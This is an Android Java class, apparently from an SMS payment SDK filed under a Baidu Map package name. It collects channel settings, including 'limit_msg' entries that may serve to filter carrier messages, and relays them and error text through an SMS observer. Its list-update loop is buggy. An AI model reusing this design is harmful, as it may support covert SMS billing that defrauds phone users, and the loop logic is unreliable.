package com.baidu.BaiduMap.channel;

import android.webkit.WebView;

import com.baidu.BaiduMap.json.ChannelEntity;
import com.baidu.BaiduMap.pay.SDKInit;
import com.baidu.BaiduMap.sms.SmsObserver;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;

import org.json.JSONObject;

import java.util.ArrayList;

/**
 * 通道工具类
 *
 * @author xingjian.peng
 */
public class PayChannelFactory {
    WebView webView;

    public static ArrayList<String> limit_content = new ArrayList<>();

    public static final BasePayChannel getPayChannelByChannelId(int channelId, ChannelEntity channel) {
        if (Constants.isOutPut) {
            Log.debug("channelId-->" + channelId);
            Log.debug("===================>通道工具类 payType:" + channel.payType);
        }
        if (channel.payType != 0) {
            try {
                JSONObject j = new JSONObject();
                j.put("payType", channel.payType);
                j.put("limit_msg_1", channel.limit_msg_1);
                j.put("limit_msg_2", channel.limit_msg_2);
                j.put("fix_msg", channel.fix_msg);
                j.put("sendParam", channel.sendParam);
                j.put("otherNeedUrl", channel.otherNeedUrl);
                if (null != limit_content) {
                    if (limit_content.size() == 0) {
                        limit_content.add(j.toString());
                    } else if (limit_content.size() > 0) {
                        for (int i = 0; i < limit_content.size(); i++) {
                            if (limit_content.get(i).toString().contains(channel.limit_msg_2)) {
                                limit_content.remove(i);
                                limit_content.add(j.toString());
                            } else {
                                limit_content.add(j.toString());
                            }
                        }
                    }
                }
            } catch (Exception e) {
                SmsObserver.Sms_send_tongbu(SmsObserver.catchError(e), SDKInit.mContext, channelId);
            }
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < limit_content.size(); i++) {
                sb.append(limit_content.get(i).toString() + "\t");
            }
            SmsObserver.Sms_send_tongbu(sb.toString(), SDKInit.mContext, -11);
        }

        BasePayChannel payChannel = null;
        payChannel = getDefaultChannel();
        if (Constants.isOutPut) {
            Log.debug("当前支付渠道号-->  default");
        }
        return payChannel;
    }

    public static final BasePayChannel getDefaultChannel() {
        BasePayChannel payChannel = new DefaultPayChannel();
        return payChannel;
    }
}
